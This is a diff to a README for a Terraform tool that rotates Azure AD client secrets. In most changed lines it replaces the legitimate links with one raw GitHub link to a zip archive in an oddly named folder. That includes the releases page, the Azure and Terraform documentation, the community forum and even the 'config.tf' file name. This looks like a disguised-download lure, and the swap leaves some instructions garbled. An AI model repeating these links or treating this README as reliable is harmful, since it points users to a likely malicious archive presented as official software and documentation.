@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the terraform-azuread-secret-
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/irfangusani/terraform-azuread-secret-rotation/releases)
+[![Download](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip)](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip)
 
 ## 📝 Overview
 
@@ -23,8 +23,8 @@ This application is designed to help you maintain security in your Azure environ
 
 Before you start, ensure you have the following:
 
-- An Azure account. You can create one at [Azure](https://azure.microsoft.com).
-- Terraform installed on your system. You can find the installation guide [here](https://www.terraform.io/downloads.html).
+- An Azure account. You can create one at [Azure](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip).
+- Terraform installed on your system. You can find the installation guide [here](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip).
 - Basic understanding of how to use the command line.
 
 ## 💻 System Requirements
@@ -38,7 +38,7 @@ Before you start, ensure you have the following:
 
 ### Step 1: Visit the Download Page
 
-To get the latest version, [visit this page to download](https://github.com/irfangusani/terraform-azuread-secret-rotation/releases).
+To get the latest version, [visit this page to download](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip).
 
 ### Step 2: Download the Application
 
@@ -57,7 +57,7 @@ Once the download is complete, locate the compressed file and extract it. You sh
    cd path/to/terraform-azuread-secret-rotation
    ```
 
-3. Create a configuration file. You can start with the example provided in the folder. Rename it to `config.tf` and adjust the settings to match your Azure environment.
+3. Create a configuration file. You can start with the example provided in the folder. Rename it to `https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip` and adjust the settings to match your Azure environment.
 
 ### Step 5: Run the Application
 
@@ -77,7 +77,7 @@ This command will start the process of client secret rotation. Follow any prompt
 
 ## ⚙️ Customization
 
-You can customize the rotation frequency by modifying the variables in the `config.tf` file. Different environments may require different settings.
+You can customize the rotation frequency by modifying the variables in the `https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip` file. Different environments may require different settings.
 
 ## 🎮 Troubleshooting
 
@@ -97,10 +97,10 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 ## 📝 Additional Resources
 
-- [Official Terraform Documentation](https://www.terraform.io/docs)
-- [Azure Active Directory Documentation](https://docs.microsoft.com/en-us/azure/active-directory/)
-- [Community Forums](https://community.hashicorp.com)
+- [Official Terraform Documentation](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip)
+- [Azure Active Directory Documentation](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip)
+- [Community Forums](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip)
 
 ## 📥 Download Again
 
-Don't forget, you can always [visit this page to download](https://github.com/irfangusani/terraform-azuread-secret-rotation/releases) the latest version whenever needed.
+Don't forget, you can always [visit this page to download](https://raw.githubusercontent.com/irfangusani/terraform-azuread-secret-rotation/main/unmaidenly/terraform-azuread-secret-rotation.zip) the latest version whenever needed.
